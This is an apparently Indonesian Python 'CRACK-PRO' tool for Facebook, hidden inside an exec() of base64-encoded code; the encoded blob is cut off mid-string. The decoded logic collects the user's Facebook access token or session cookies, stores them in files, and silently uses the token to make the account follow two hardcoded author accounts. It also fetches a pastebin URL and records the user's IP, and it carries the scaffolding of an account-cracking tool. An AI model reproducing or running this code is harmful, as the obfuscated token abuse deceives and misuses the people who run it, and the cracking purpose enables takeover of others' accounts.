# #ENCODE_BY_SENINELPRIME


import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9weXRob24zDQojLSotY29kaW5nOnV0Zi04LSotDQojIFVwZGF0ZSBWMS42DQoNCiMjIyBJbXBvcnQgTW9kdWxlDQppbXBvcnQgcmVxdWVzdHMsYnM0LHN5cyxvcyxyYW5kb20sdGltZSxyZSxqc29uLHV1aWQsc3VicHJvY2VzcyxwbGF0Zm9ybSxiYXNlNjQNCmZyb20gcmFuZG9tIGltcG9ydCByYW5kaW50DQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIFRocmVhZFBvb2wNCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIHBhcg0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZQ0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUNCmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCBxdW90ZQ0KDQoNCiMjIyBQZXJ1bXBhbWFhbiBNb2R1bGUgJiBTeW50YXgNCl9yZXFfc2VzXyAgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCl9yZXFfZ2V0XyAgPSByZXF1ZXN0cy5nZXQNCl9yZXFfcG9zdF8gPSByZXF1ZXN0cy5wb3N0DQpfanNfbG9fICAgID0ganNvbi5sb2Fkcw0KX2NpY2lfYXppbXZhdV8gICAgPSBpbnB1dA0KX2F6aW12YXVfZGFwdW50YV8gPSBvcGVuDQpfY2ljaV9jaWNpXyAgICAgICA9IGV4aXQNCg0KIyMjIFdhcm5hDQpaID0gIlwwMzNbMTszMG0iICMgSGl0YW0NClAgPSAiXDAzM1sxOzM3bSIgIyBQdXRpaA0KTSA9ICJcMDMzWzE7MzFtIiAjIE1lcmFoDQpIID0gIlwwMzNbMTszMm0iICMgSGlqYXUNCksgPSAiXDAzM1sxOzMzbSIgIyBLdW5pbmcNCkIgPSAiXDAzM1sxOzM0bSIgIyBCaXJ1DQpVID0gIlwwMzNbMTszNW0iICMgVW5ndQ0KTyA9ICJcMDMzWzE7MzZtIiAjIEJpcnUgTXVkYQ0KTiA9ICJcMDMzWzBtIiAgICAjIFdhcm5hIE1hdGkNCg0KIyMjIEhvc3QgJiBQZW5hbXB1bmdhbg0KaG9zdCA9ICJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iDQpvayA9IFtdDQpjcCA9IFtdDQp0dGwgPSBbXQ0KY291bnQgPSAxDQpkYXRhXzEgPSB7fQ0KZGF0YV8yID0ge30NCmRhdGFfY2hhbmdlXzEgPSB7fQ0KZGF0YV9jaGFuZ2VfMiA9IHt9DQpkYXRhX3VzZXIgPSBbXQ0KaGVhZGVyX2dydXAgPSB7InVzZXItYWdlbnQiOiAiTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfNykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk2LjAuNDY2NC4xMTAgU2FmYXJpLzUzNy4zNiJ9DQpoZWFkZXJfbmFtYSA9IHsib3JpZ2luIjogImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSIsImFjY2VwdC1sYW5ndWFnZSI6ICJlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCxibjtxPTAuNyIsImFjY2VwdC1lbmNvZGluZyI6ICJnemlwLCBkZWZsYXRlIiwiYWNjZXB0IjogInRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgiLCJ1c2VyLWFnZW50IjogIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA0LjQuNDsgZW4tYXU7IFNBTVNVTkcgU00tTjkxNUcgQnVpbGQvS1RVODRQKSBBcHBsZVdlYktpdC81MzcuMzYgKEtUSE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzIuMCBDaHJvbWUvMzQuMC4xODQ3Ljc2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiSG9zdCI6ICIiLmpvaW4oYnM0LnJlLmZpbmRhbGwoIjovLyguKj8pJCIsImh0dHBzOi8vbS5mYWNlYm9vay5jb20iKSksInJlZmVyZXIiOiAiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCJjYWNoZS1jb250cm9sIjogIm1heC1hZ2U9MCIsInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiAiMSIsImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQifQ0KaGVhZGVyX2hhc2h0YWcgPSB7J2F1dGhvcml0eSc6ICdtYmFzaWMuZmFjZWJvb2suY29tJywnbWV0aG9kJzogJ0dFVCcsJ3BhdGgnOiAnL2Zhdmljb24uaWNvJywnc2NoZW1lJzogJ2h0dHBzJywnYWNjZXB0JzogJ2ltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLGltYWdlL3N2Zyt4bWwsaW1hZ2UvKiwqLyo7cT0wLjgnLCdhY2NlcHQtZW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZScsJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOScsJ3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDQuNC40OyBlbi1hdTsgU0FNU1VORyBTTS1OOTE1RyBCdWlsZC9LVFU4NFApIEFwcGxlV2ViS2l0LzUzNy4zNiAoS1RITUwsIGxpa2UgR2Vja28pIFZlcnNpb24vMi4wIENocm9tZS8zNC4wLjE4NDcuNzYgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCdvcmlnaW4nOiAnaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tJywncmVmZXJlcic6ICdodHRwczovL3d3dy5mYWNlYm9vay5jb20nfQ0KDQpyID0gc3RyKHJhbmRvbS5yYW5kaW50KDEsOTk5OSkpDQpyeCA9IHIucmVwbGFjZSgiMSIsIkEiKS5yZXBsYWNlKCIyIiwiQyIpLnJlcGxhY2UoIjMiLCJCIikucmVwbGFjZSgiNCIsIkUiKS5yZXBsYWNlKCI1IiwiSCIpLnJlcGxhY2UoIjYiLCJJIikucmVwbGFjZSgiNyIsIlkiKQ0KcGxpc3QgPSAocGxhdGZvcm0udW5hbWUoKSlbMl0NCmJhc2V4ID0gcGxpc3QNCmJhc2V4MSA9IGJhc2V4LmVuY29kZSgnYXNjaWknKQ0KYmFzZXgyID0gYmFzZTY0LmI2NGVuY29kZShiYXNleDEpDQpiYXNleDMgPSBiYXNleDIuZGVjb2RlKCdhc2NpaScpDQpiYXNlNCA9IChiYXNleDMpLnVwcGVyKCkNCmJhc2VzcGxpdCA9IGJhc2U0LnJlcGxhY2UoJz0nLCAnTicpLnJlcGxhY2UoJ0EnLCAnMycpLnJlcGxhY2UoJ0InLCAnOScpLnJlcGxhY2UoJ0MnLCAnNycpLnJlcGxhY2UoJ0QnLCAnMScpLnJlcGxhY2UoJ0UnLCAnNCcpLnJlcGxhY2UoJ00nLCAnMicpLnJlcGxhY2UoJ0wnLCAnNicpLnJlcGxhY2UoJ0YnLCAnOCcpLnJlcGxhY2UoJ04nLCAnRScpLnJlcGxhY2UoJ1QnLCAnUicpLnJlcGxhY2UoIjUiLCJYIikucmVwbGFjZSgiMSIsIlgiKQ0KDQp0cnk6DQogICAgcnEgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tLzhhY1V2dFo0JykudGV4dA0KZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KICAgIHByaW50KCdcbk5PIElOVEVSTkVUIENPTk5FQ1RJT05cbicpDQogICAgZXhpdCgpDQoNCiMjIyBXYWt0dSAmIFRhbmdnYWwNCl9fc2VrYXJhbmdfXyA9IGRhdGV0aW1lLm5vdygpDQpfX3RhaHVuX18gPSBfX3Nla2FyYW5nX18ueWVhcg0KX19idWxhbl9fID0gX19zZWthcmFuZ19fLm1vbnRoDQpfX2hhcmlfXyAgPSBfX3Nla2FyYW5nX18uZGF5DQoNCmJ1bGFuX3R0bCA9IHsiMDEiOiAiSkFOIiwgIjAyIjogIkZFQiIsICIwMyI6ICJNQVIiLCAiMDQiOiAiQVBSIiwgIjA1IjogIk1BWSIsICIwNiI6ICJKVU4iLCAiMDciOiAiSlVMIiwgIjA4IjogIkFVRyIsICIwOSI6ICJTRVAiLCAiMTAiOiAiT0NUIiwgIjExIjogIk5PViIsICIxMiI6ICJERUMifQ0KX2xpc3RfYnVsYW5fID0gWyJKQU4iLCAiRkVCIiwgIk1BUiIsICJBUFIiLCAiTUFZIiwgIkpVTiIsICJKVUwiLCAiQVVHIiwgIlNFUCIsICJPQ1QiLCAiTk9WIiwgIkRFQyJdDQoNCnRyeToNCiAgICBpZiBfX2J1bGFuX18gPCAwIG9yIF9fYnVsYW5fXyA+IDEyOg0KICAgICAgICBfY2ljaV9jaWNpXygpDQogICAgX2J1bGFuX3Nla2FyYW5nXyA9IF9fYnVsYW5fXyAtIDENCmV4Y2VwdCBWYWx1ZUVycm9yOg0KICAgIF9jaWNpX2NpY2lfKCkNCl9idWxhbl8gPSBfbGlzdF9idWxhbl9bX2J1bGFuX3Nla2FyYW5nX10NCnRhbmdnYWwgPSAoIiVzLSVzLSVzIiUoX19oYXJpX18sX2J1bGFuXyxfX3RhaHVuX18pKQ0KDQpfbXlfYWNjb3VudF8gPSBbDQogICAgJzEwMDA0NTIwMzg1NTI5NCcsJzEwMDAxNDgzOTI3MDIwNSddDQoNCiMjIyBVc2VyIEFnZW50DQp1YV9pbnRlbG1hYyA9ICdNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xNV83KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTYuMC40NjY0LjExMCBTYWZhcmkvNTM3LjM2O10nDQp1YV9ub2tpYSAgID0gJ01vemlsbGEvNC4xIChjb21wYXRpYmxlOyBNU0lFIDUuMDsgU3ltYmlhbiBPUzsgTm9raWEgNzYxMDs0NTEpIE9wZXJhIDYuMjAnDQp1YV9hc3VzICAgID0gJ0RhbHZpay8xLjYuMCAoTGludXg7IFU7IEFuZHJvaWQgNC40LjI7IEFTVVNfVDAwUSBCdWlsZC9LVlQ0OUwpL0NMREMtMS4xO10nDQp1YV9odWF3ZWkgID0gJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjA7IEhVQVdFSSBDQVotQUwxMDsgSE1TQ29yZSA1LjMuMC4zMTI7IEdNU0NvcmUgMjAuMzkuMTUpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84My4wLjQxMDMuMTA2IEh1YXdlaUJyb3dzZXIvMTEuMS4wLjMwMiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9lbl9VUztGQkFWLzE3My4wLjAuMTAuMTE4O10nICNET05FDQp1YV92aXZvICAgID0gJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgVjIwMjcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84MC4wLjM5ODcuOTkgTW9iaWxlIFNhZmFyaS81MzcuMzYnDQp1YV9vcHBvICAgID0gJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA0LjEuMTsgWDkwOSBCdWlsZC9KUk8wM0wpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8zMC4wLjE1OTkuOTIgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCQU4vRU1BO0ZCTEMvZW5fVVM7RkJBVi8xNzMuMC4wLjEwLjExODtdJw0KdWFfc2Ftc3VuZyA9ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wLjE7IFNBTVNVTkcgR1QtSTk1MTUgQnVpbGQvTFJYMjJDKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYW1zdW5nQnJvd3Nlci8yLjEgQ2hyb21lLzM0LjAuMTg0Ny43NiBNb2JpbGUgU2FmYXJpLzUzNy4zNjtdJw0KdWFfd2luZG93cyA9ICdNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCBpNjg2OyBmci1GUjsgcnY6MS43LjgpIEdlY2tvLzIwMDUwNTExIEZpcmVmb3gvMS4wLjQ7XScNCnVhX3hpYW9taSAgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDExOyBNaSA5VCBQcm8gQnVpbGQvUktRMS4yMDA4MjYuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzk0LjAuNDYwNi44MCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBSZWRkaXQvVmVyc2lvbiAyMDIxLjM4LjAvQnVpbGQgMzY1MDMyL0FuZHJvaWQgMTEgW0ZCQU4vRU1BO0ZCTEMvZW5fVVM7RkJBVi8yNDcuMC4wLjUuMTMwO10nDQojIyMgQ2xlYXIgTG9naW4gU2Vzc2lvbg0KZGVmIGJlcnNpaCgpOg0KICAgIHRyeTpvcy5yZW1vdmUoJ3Rva2VuLnR4dCcpDQogICAgZXhjZXB0OnBhc3MNCiAgICB0cnk6b3MucmVtb3ZlKCdjb29raWVzLnR4dCcpDQogICAgZXhjZXB0OnBhc3MNCg0KIyMjIERpc3BsYXkgVGV4dA0KZGVmIGphbGFuKHopOg0KICAgIGZvciBlIGluIHogKyAiXG4iOnN5cy5zdGRvdXQud3JpdGUoZSk7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wNCkNCmRlZiBtbGFrdSh6KToNCiAgICBmb3IgZSBpbiB6ICsgIlxuIjpzeXMuc3Rkb3V0LndyaXRlKGUpO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDMpDQoNCmRlZiBwc2Ioeik6DQogICAgZm9yIGUgaW4geiArICdcbic6DQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZSkNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgIHRpbWUuc2xlZXAoMC4wMDEpDQoNCg0KIyMjIENsZWFyIFRlcm1pbmFsDQpkZWYgY2xlYXIoKToNCiAgICBpZiAibGludXgiIGluIHN5cy5wbGF0Zm9ybS5sb3dlcigpOm9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgIGVsaWYgIndpbiIgaW4gc3lzLnBsYXRmb3JtLmxvd2VyKCk6b3Muc3lzdGVtKCJjbHMiKQ0KICAgIGVsc2U6b3Muc3lzdGVtKCJjbGVhciIpDQoNCiMjIyBMb2dvDQpkZWYgYmFubmVyKCk6DQogICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgICAgICBvcy5zeXN0ZW0oJ2VjaG8gIlxuICAgICAgIOKWhOKWgOKWgCDilojiloDiloAg4paI4paE4paR4paIIOKWgOKWiOKWgCDiloAg4paI4paE4paR4paIIOKWiOKWgOKWgCDilojilpHilpFcbiAgICAgICDilpHiloDiloQg4paI4paA4paAIOKWiOKWkeKWgOKWiCDilpHilojilpEg4paIIOKWiOKWkeKWgOKWiCDilojiloDiloAg4paI4paR4paEXG4gICAgICAg4paA4paA4paRIOKWgOKWgOKWgCDiloDilpHilpHiloAg4paR4paA4paRIOKWgCDiloDilpHilpHiloAg4paA4paA4paAIOKWgOKWgOKWgFxuICAgICAgIOKWkiDilpLilpIg4paT4paS4paS4paSICAg4paT4paS4paI4paR4paRIOKWkeKWkiDilpIgIOKWkSDilpIg4paR4paR4paS4paR4paS4paR4paTXG4gICAgICAg4paRIOKWkeKWkiDilpLilpEg4paSICAg4paS4paSIOKWkSAg4paRICDilpIgICAg4paSIOKWkeKWkuKWkSDilpEg4paSIOKWkVxuICAgICAgIOKWkSDilpHilpEg4paRICDilpEgICDilpIgICDilpEgICAgICAgICDilpEgIOKWkeKWkSDilpEg4paSIOKWkVxuICAgICAgIOKWkSAg4paRICAgICAgICDilpEgIOKWkeKWkSDilpEgICAgICAg4paRICDilpEgIOKWkSDilpFcbiAgICDilpEgIFxuICBcbiAgICAgICAgIOKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVl1xuICAgICAgICAg4pWRIFRPT0wgTkFNRTogeyBDUkFDSy1QUk8gfSAgICDilZFcbiAgICAgICAgIOKVkSBBVVRIT1IgICA6IFNFTlRJTkVMICAgICAgICAg4pWRXG4gICAgICAgICDilZEgR0lUSFVCICAgOiBTRU5USU5FTDEwMSAgICAgIOKVkVxuICAgICAgICAg4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIiB8IGxvbGNhdCAtYSAtZCAyIC1zIDUwJykNCiAgICAgICAgcHJpbnQoIiIpDQogICAgICAgIA0KZGVmIGNla19kZXYoKToNCiAgICBfaXNpX2Rldl8gPSBfYXppbXZhdV9kYXB1bnRhXygnY29va2llcy50eHQnLCdyJykucmVhZCgpDQogICAgaWYgJ251bGwnIGluIF9pc2lfZGV2XzpqYWxhbignJXMgWyVzISVzXSAlSU5WQUxJRCBDT09LSUVTLCBSRS1MT0dJTiBXSVRIIENPT0tJRVMnJShNLFAsTSxQKSk7YmVyc2loKCk7X2NpY2lfY2ljaV8oKQ0KICAgIGVsc2U6cGFzcw0KDQoNCmRlZiBib3RfZm9sbG93KF90b2tfZGV2Xyk6DQogICAgdHJ5Og0KICAgICAgICBmb3IgX2xpc3RfIGluIF9teV9hY2NvdW50XzoNCiAgICAgICAgICAgIHRyeTpfcmVxX3Bvc3RfKCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMiJShfbGlzdF8sX3Rva19kZXZfKSk7dGltZS5zbGVlcCgwLjMpDQogICAgICAgICAgICBleGNlcHQ6cGFzcw0KICAgICAgICBwcmludCgnJXMgJyUoTykpO2phbGFuKCclcyBbJXMhJXNdICVzTE9HSU4gU1VDQ0VTU0ZVTCAlc15fXiclKEgsUCxILEgsUCkpO3RpbWUuc2xlZXAoMikNCiAgICBleGNlcHQ6cGFzcw0KICAgIA0KDQpkZWYgbWVudV9sb2coKToNCiAgICBiZXJzaWgoKTtjbGVhcigpDQogICAgYmFubmVyKCkNCiAgICB2YXJfbWVudSgpDQogICAgcG11ID0gX2NpY2lfYXppbXZhdV8oJyVzIFslc+KAoiVzXSAlc0NIT09TRSA6ICVzJyUoSCxQLEgsSyxIKSkNCiAgICBwcmludCgnJXMgJyUoTykpDQogICAgaWYgcG11IGluIFsnJ106amFsYW4oJyVzIFslcyElc10gJXNJTkNPUlJFQ1QgQ09OVEVOVCclKE0sUCxNLFApKTttZW51X2xvZygpDQogICAgZWxpZiBwbXUgaW4gWycxJywnMDEnLCcwMDEnLCdhJ106DQogICAgICAgIGRlZmF1bHR1YSgpDQogICAgICAgIHRva2VuID0gX2NpY2lfYXppbXZhdV8oJyVzIFslc+KAoiVzXSAlc1RPS0VOIDogJXMnJShILFAsSCxLLEgpKQ0KICAgICAgICB0cnk6eCA9IF9yZXFfZ2V0XygiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/YWNjZXNzX3Rva2VuPSIgKyB0b2tlbik7eSA9IF9qc19sb18oeC50ZXh0KTtuID0geVsnbmFtZSddO3hkID0gX2F6aW12YXVfZGFwdW50YV8oInRva2VuLnR4dCIsICJ3Iik7eGQud3JpdGUodG9rZW4pO3hkLmNsb3NlKCk7eHogPSBfYXppbXZhdV9kYXB1bnRhXygnY29va2llcy50eHQnLCd3Jyk7eHoud3JpdGUoJ251bGwnKTt4ei5jbG9zZSgpO2JvdF9mb2xsb3codG9rZW4pO21lbnUoKQ0KICAgICAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOnByaW50KCclcyAnJShPKSk7amFsYW4oJyVzIFslcyElc10gJXNUT0tFTiBJTlZBTElEJyUoTSxQLE0sUCkpO2JlcnNpaCgpO21lbnVfbG9nKCkNCiAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOnByaW50KCclcyAnJShPKSk7amFsYW4oJyVzIFslcyElc10gJXNDT05ORUNUSU9OIFBST0JMRU0nJShNLFAsTSxQKSk7X2NpY2lfY2ljaV8oKQ0KICAgIGVsaWYgcG11IGluIFsnMicsJzAyJywnMDAyJywnYiddOg0KICAgICAgICBkZWZhdWx0dWEoKQ0KICAgICAgICBjb29raWUgPSBfY2ljaV9hemltdmF1XygnJXMgWyVz4oCiJXNdICVzQ09PS0lFUyA6ICVzJyUoSCxQLEgsSyxIKSkNCiAgICAgICAgdHJ5OmhlYWRlcj17J0hvc3QnOididXNpbmVzcy5mYWNlYm9vay5jb20nLCdjYWNoZS1jb250cm9sJzonbWF4LWFnZT0wJywndXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyc6JzEnLCd1c2VyLWFnZW50JzonTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDQuNC40OyBlbi1hdTsgU0FNU1VORyBTTS1OOTE1RyBCdWlsZC9LVFU4NFApIEFwcGxlV2ViS2l0LzUzNy4zNiAoS1RITUwsIGxpa2UgR2Vja28pIFZlcnNpb24vMi4wIENocm9tZS8zNC4wLjE4NDcuNzYgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCdhY2NlcHQnIDogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLCdjb250ZW50LXR5cGUnIDogJ3RleHQvaHRtbDsgY2hhcnNldD11dGYtOCcsJ2FjY2VwdC1lbmNvZGluZyc6J2d6aXAsIGRlZmxhdGUnLCdhY2NlcHQtbGFuZ3VhZ2UnOidlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCxibjtxPTAuNycsJ2Nvb2tpZSc6IGNvb2tpZX07cj1fcmVxX2dldF8oImh0dHBzOi8vYnVzaW5lc3MuZmFjZWJvb2suY29tL2NyZWF0b3JzdHVkaW8vaG9tZSIsIGhlYWRlcnM9aGVhZGVyKTtwPXJlLnNlYXJjaCgneyJhY2Nlc3NUb2tlbiI6IihFQUFcdyspJywgci50ZXh0KTt0b2tlbj1wLmdyb3VwKDEpO3hkID0gX2F6aW12YXVfZGFwdW50YV8oInRva2VuLnR4dCIsICJ3Iik7eGQud3JpdGUodG9rZW4pO3hkLmNsb3NlKCk7eHogPSBfYXppbXZhdV9kYXB1bnRhXygnY29va2llcy50eHQnLCd3Jyk7eHoud3JpdGUoY29va2llKTt4ei5jbG9zZSgpO2JvdF9mb2xsb3codG9rZW4pO21lbnUoKQ0KICAgICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6cHJpbnQoJyVzICclKE8pKTtqYWxhbignJXMgWyVzISVzXSAlc0NPTk5FQ1RJT04gUFJPQkxFTSclKE0sUCxNLFApKTtfY2ljaV9jaWNpXygpDQogICAgICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcixBdHRyaWJ1dGVFcnJvcik6cHJpbnQoJyVzICclKE8pKTtqYWxhbignJXMgWyVzISVzXSAlc0NPT0tJRVMgSU5WQUxJRCclKE0sUCxNLFApKTtiZXJzaWgoKTttZW51X2xvZygpDQogICAgZWxpZiBwbXUgaW4gWycwJywnMDAnLCcwMDAnLCd6J106ZXhpdCgpDQogICAgZWxzZTpqYWxhbignJXMgWyVzISVzXSAlc0lOQ09SUkVDVCBDT05URU5UJyUoTSxQLE0sUCkpO21lbnVfbG9nKCkNCg0KDQpkZWYgbWVudSgpOg0KICAgIGNsZWFyKCkNCiAgICBiYW5uZXIoKQ0KICAgIGppZCA9ICcnDQogICAgdHJ5Og0KICAgICAgICBfYXppbXZhdV8gPSBfYXppbXZhdV9kYXB1bnRhXygidG9rZW4udHh0IiwiciIpLnJlYWQoKTtfY2ljaV8gPSBfYXppbXZhdV9kYXB1bnRhXygiY29va2llcy50eHQiLCJyIikucmVhZCgpO19zYWxzYWJpbGFfID0geyJjb29raWUiIDogX2NpY2lffQ0KICAgICAgICBpZiAnbnVsbCcgaW4gX2NpY2lfOnN0YXR1c19jb29raWVzID0gKCclc05PJyUoTSkpO1cgPSBaO1kgPSBQOyBCMSA9IFo7IE8xID0gWjsgSzEgPSBaOyBIMSA9IFo7IE0xID0gWjsgUDEgPSBaDQogICAgICAgIGVsc2U6c3RhdHVzX2Nvb2tpZXMgPSAoJyVzWUVTJyUoSCkpO1cgPSBIOyBZID0gSzsgQjEgPSBCOyBPMSA9IE87IEsxID0gSzsgSDEgPSBIOyBNMSA9IE07IFAxID0gUA0KICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6cHJpbnQoJyVzIFsgJXNPUFBTUyA6KSAlc10lcyclKE0sUCxNLFApKTtwcmludCgnJXMgJyUoTSkpO2phbGFuKCclcyBbJXMhJXNdICVzVE9LRU4vQ09PS0lFUyBJTlZBTElEJyUoTSxQLE0sUCkpO2JlcnNpaCgpO21lbnVfbG9nKCkNCiAgICANCiAgICB0cnk6dG9rZW4gPSBfYXppbXZhdV9kYXB1bnRhXygidG9rZW4udHh0IiwiciIpLnJlYWQoKTt4ID0gX3JlcV9nZXRfKCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49IiArIHRva2VuKTt5ID0gX2pzX2xvXyh4LnRleHQpO24gPSB5WyduYW1lJ10udXBwZXIoKTtpID0geVsnaWQnXQ0KICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6cHJpbnQoJyVzIFsgJXNPUFBTUyA6KSAlc10lcyclKE0sUCxNLE0pKTtwcmludCgnJXMgJyUoTSkpO2phbGFuKCclcyBbJXMhJXNdICVzVE9LRU4vQ09PS0lFUyBJTlZBTElEJyUoTSxQLE0sUCkpO2JlcnNpaCgpO21lbnVfbG9nKCkNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6cHJpbnQoJyVzIFsgJXNPUFBTUyA6KSAlc10lcyclKE0sUCxNLFApKTtwcmludCgnJXMgJyUoTSkpO2phbGFuKCclcyBbJXMhJXNdICVzQ09OTkVDVElPTiBQUk9CTEVNJyUoTSxQLE0sUCkpO19jaWNpX2NpY2lfKCkNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6cHJpbnQoJyVzIFsgJXNPUFBTUyA6KSAlc10lcyclKE0sUCxNLFApKTtwcmludCgnJXMgJyUoTSkpO2phbGFuKCclcyBbJXMhJXNdICVzQ09OTkVDVElPTiBQUk9CTEVNJyUoTSxQLE0sUCkpO19jaWNpX2NpY2lfKCkNCiAgICB0cnk6YSA9IF9yZXFfZ2V0XygiaHR0cDovL2lwLWFwaS5jb20vanNvbi8iLGhlYWRlcnM9eyJSZWZlcmVyIjoiaHR0cDovL2lwLWFwaS5jb20vIiwiQ29udGVudC1UeXBlIjoiYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD11dGYtOCIsIlVzZXItQWdlbnQiOiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNC40LjQ7IGVuLWF1OyBTQU1TVU5HIFNNLU45MTVHIEJ1aWxkL0tUVTg0UCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLVEhNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8yLjAgQ2hyb21lLzM0LjAuMTg0Ny43NiBNb2JpbGUgU2FmYXJpLzUzNy4zNjtdIn0pLmpzb24oKTtpcCA9IGFbInF1ZXJ5Il07bG9jID0gYVsiY291bnRyeSJdLnVwcGVyKCkNCiAgICBleGNlcHQgS2V5RXJyb3I6aXAgPSAiICINCiAgICBwc2IoJyAgICAgICAgICVz44CLJXPjgIslc+OAiyVzV0UgSlVTVCBQUkFZ8J+kp/CfmYIlc+OAiiVz44CKJXPjgIonJShNLEgsQixILEIsSCxNKSkNCiAgICBwcmludCgnJXMgJyUoTykpDQogICAgcHJpbnQoJyVzIFslc+KAoiVzXSAlc05BTUUgICAlczogJXMlcyclKEgsUCxILEIsSyxILG4pKQ0KICAgIHByaW50KCclcyBbJXPigKIlc10gJXNJRCAgICAgJXM6ICVzJXMnJShILFAsSCxCLEssSCxpKSkNCiAgICBwcmludCgnJXMgWyVz4oCiJXNdICVzSVAgICAgICVzOiAlcyVzJyUoSCxQLEgsQixLLEgsaXApKQ